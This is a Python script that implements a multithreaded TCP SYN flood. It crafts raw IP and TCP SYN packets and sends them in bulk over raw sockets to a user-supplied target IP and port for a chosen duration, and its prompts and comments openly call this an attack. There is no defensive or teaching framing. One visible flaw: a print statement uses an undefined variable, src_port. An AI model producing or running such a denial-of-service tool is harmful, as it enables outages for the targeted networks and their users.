import socket
import threading
import random
import time
from struct import pack, unpack

# Function to calculate checksum
def checksum(data):
    if len(data) % 2 != 0:
        data += b'\0'
    s = sum(int.from_bytes(data[i:i+2], 'big') for i in range(0, len(data), 2))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

# Function to create a SYN packet
def create_syn_packet(src_ip, dst_ip, dst_port):
    src_port = random.randint(1024, 65535)
    seq_num = random.randint(0, 4294967295)
    ack_num = 0
    offset_res = (5 << 4) + 0
    flags = 0x02  # SYN flag
    window = socket.htons(5840)
    checksum_val = 0
    urg_ptr = 0

    ip_header = pack('!BBHHHBBH4s4s',
                     69, 0, 40, random.randint(0, 65535), 0, 255, socket.IPPROTO_TCP, 0,
                     socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
    
    tcp_header = pack('!HHLLBBHHH',
                      src_port, dst_port, seq_num, ack_num, offset_res, flags, window, checksum_val, urg_ptr)
    
    pseudo_header = pack('!4s4sBBH',
                         socket.inet_aton(src_ip), socket.inet_aton(dst_ip), 0, socket.IPPROTO_TCP, len(tcp_header))
    
    checksum_val = checksum(pseudo_header + tcp_header)
    
    tcp_header = pack('!HHLLBBH',
                      src_port, dst_port, seq_num, ack_num, offset_res, flags, window) + pack('H', checksum_val) + pack('!H', urg_ptr)
    
    packet = ip_header + tcp_header
    return packet

# Function to send SYN packets
def send_syn_packet(target_ip, target_port, rpc_count):
    try:
        src_ip = socket.gethostbyname(socket.gethostname())
        for _ in range(rpc_count):
            packet = create_syn_packet(src_ip, target_ip, target_port)
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            s.sendto(packet, (target_ip, 0))
            s.close()
            print(f"Sent SYN packet from {src_ip}:{src_port} to {target_ip}:{target_port}")
    except socket.error as e:
        print(f"Send error: {e}")

# Function to run the SYN flood attack using multiple threads
def syn_flood(target_ip, target_port, thread_count, rpc_count, duration):
    def thread_target(end_time):
        while time.time() < end_time:
            send_syn_packet(target_ip, target_port, rpc_count)
            time.sleep(0.1)  # Short delay before sending the next request

    threads = []
    end_time = time.time() + duration
    
    for _ in range(thread_count):
        thread = threading.Thread(target=thread_target, args=(end_time,))
        thread.daemon = True
        threads.append(thread)
        thread.start()
    
    # Keep the main thread alive for the duration of the attack
    try:
        while time.time() < end_time:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Stopping the attack...")

# Main function to get user input and start the attack
def main():
    target_ip = input("Enter the target IP address: ")
    target_port = int(input("Enter the target port: "))
    thread_count = int(input("Enter the number of threads: "))
    rpc_count = int(input("Enter the number of RPCs per thread: "))
    duration = int(input("Enter the duration of the attack in seconds: "))

    # Start the SYN flood attack
    syn_flood(target_ip, target_port, thread_count, rpc_count, duration)

if __name__ == "__main__":
    main()
